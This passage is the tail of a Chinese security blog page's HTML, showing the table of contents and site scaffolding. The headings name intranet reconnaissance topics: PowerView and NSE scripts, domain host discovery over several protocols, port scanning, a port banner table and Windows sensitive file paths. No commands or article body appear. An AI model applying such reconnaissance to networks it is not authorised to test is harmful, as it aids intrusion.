href="#NSE-%E8%84%9A%E6%9C%AC"><span class="toc-number">2.8.4.</span> <span class="toc-text">NSE 脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PowerView-%E8%84%9A%E6%9C%AC"><span class="toc-number">2.8.5.</span> <span class="toc-text">PowerView 脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.9.</span> <span class="toc-text">域内存活主机探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87ICMP%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.9.1.</span> <span class="toc-text">通过ICMP协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87ARP%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.9.2.</span> <span class="toc-text">通过ARP协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-Netbios-%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.9.3.</span> <span class="toc-text">通过 Netbios 协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-UDP-%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.9.4.</span> <span class="toc-text">通过 UDP 协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-SNMP-%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.9.5.</span> <span class="toc-text">通过 SNMP 协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87SMB%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.9.6.</span> <span class="toc-text">通过SMB协议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.10.</span> <span class="toc-text">域内端口扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3-Banner-%E4%BF%A1%E6%81%AF%E8%A1%A8"><span class="toc-number">3.</span> <span class="toc-text">端口 Banner 信息表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.1.</span> <span class="toc-text">文件共享服务端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.2.</span> <span class="toc-text">远程连接服务端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.3.</span> <span class="toc-text">数据库服务端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.4.</span> <span class="toc-text">邮件服务端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.5.</span> <span class="toc-text">网络常见协议端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.6.</span> <span class="toc-text">特殊服务端口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-%E6%95%8F%E6%84%9F%E8%B7%AF%E5%BE%84"><span class="toc-number">4.</span> <span class="toc-text">Windows 敏感路径</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E7%B3%BB%E7%BB%9F%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="toc-number">4.1.</span> <span class="toc-text">Windows 系统敏感文件</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('https://baiker.top/img/wallhaven-gj977q.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By BaiKer</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'B4CWJLUwBNNEjD2SoNxuy03K-gzGzoHsz',
      appKey: '6vo75MB0241puEkTNHhBsuv9',
      placeholder: '记得留下你的昵称和邮箱....可以快速收到回復',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      path: window.location.pathname,
      requiredFields: ["nick,mail"],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><link rel="stylesheet" href="https://baiker.top/css/custom.css"><script async data-pjax src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>